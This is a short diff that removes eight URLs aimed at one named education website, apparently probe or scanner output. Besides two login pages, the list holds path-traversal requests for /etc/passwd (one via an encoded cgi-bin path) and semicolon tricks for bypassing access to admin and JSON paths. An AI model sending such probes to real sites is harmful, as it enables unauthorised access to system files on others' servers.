@@ -1,8 +1,0 @@
-https://zzcs.zizhu-edu.com/login.html
-https://zzcs.zizhu-edu.com/loginPC.html
-https://zzcs.zizhu-edu.com/;admin/
-https://zzcs.zizhu-edu.com/;json/
-https://zzcs.zizhu-edu.com/;login/
-https://zzcs.zizhu-edu.com/\..\..\..\..\..\..\..\..\..\etc\passwd
-https://zzcs.zizhu-edu.com/a%5c.aspx
-https://zzcs.zizhu-edu.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
